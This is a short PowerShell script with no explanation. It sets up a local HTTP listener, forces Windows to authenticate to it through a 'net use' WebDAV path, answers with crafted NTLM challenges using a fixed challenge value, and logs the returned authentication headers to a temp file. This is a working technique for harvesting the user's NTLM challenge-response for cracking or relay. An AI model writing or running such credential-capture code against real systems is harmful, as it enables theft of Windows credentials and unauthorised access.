$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add('http://127.0.0.1:9081/')
$listener.Start()
Start-Job -ScriptBlock { net use f: \\127.0.0.1@9081\c$ }
$challenge = 'TlRMTVNTUAACAAAAAAAAAAAAAAAFgomiESIzRFVmd4gAAAAAAAAAAAAAAAAAAAAA'
for ($i = 0; $i -lt 4; $i++) {
    $context = $listener.GetContext()
    if ($context.Request.Headers['Authorization']) {
        $context.Request.Headers['Authorization'] | Out-File -Append "$env:TEMP\handshakes.log"
    }
    $context.Response.StatusCode = 401
    $context.Response.AddHeader('WWW-Authenticate', "NTLM $challenge")
    $context.Response.Close()
}
$listener.Stop()
